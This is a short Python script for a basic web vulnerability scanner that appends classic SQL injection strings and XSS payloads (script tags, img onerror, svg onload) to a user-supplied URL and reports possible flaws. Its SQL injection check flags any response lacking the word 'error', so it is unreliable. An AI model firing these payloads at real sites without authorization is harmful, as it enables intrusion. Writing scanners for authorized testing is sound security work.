import requests

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND (SELECT * FROM users) --"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]

    def test_sqli(self):
        for payload in self.sqli_payloads:
            response = requests.get(self.target_url + payload)
            if "error" not in response.text.lower():  # Adjust this check based on the application
                print(f"Potential SQL Injection vulnerability found with payload: {payload}")

    def test_xss(self):
        for payload in self.xss_payloads:
            response = requests.get(self.target_url + payload)
            if payload in response.text:
                print(f"Potential XSS vulnerability found with payload: {payload}")

    def run(self):
        print(f"Scanning {self.target_url} for vulnerabilities...")
        self.test_sqli()
        self.test_xss()

if __name__ == "__main__":
    target = input("Enter the target URL: ")
    scanner = WebVulnScanner(target)
    scanner.run()
